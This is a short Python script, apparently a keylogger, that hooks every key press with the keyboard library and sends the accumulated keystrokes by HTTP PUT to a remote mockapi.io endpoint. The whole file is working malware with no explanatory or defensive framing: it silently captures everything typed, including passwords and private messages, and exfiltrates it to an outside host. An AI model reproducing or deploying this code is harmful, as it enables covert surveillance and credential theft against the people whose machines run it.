import keyboard
import requests

endpoint = 'https://66d01366181d09277dd1e94.mockapi.io/a/ws'
data = requests.get(f"{endpoint}/1").json()

def on_key_press(event):
    data["char"] += " " if event.name == "space" else event.name
    requests.put(f"{endpoint}/1", json={'char': data["char"]})

keyboard.on_press(on_key_press)
keyboard.wait()
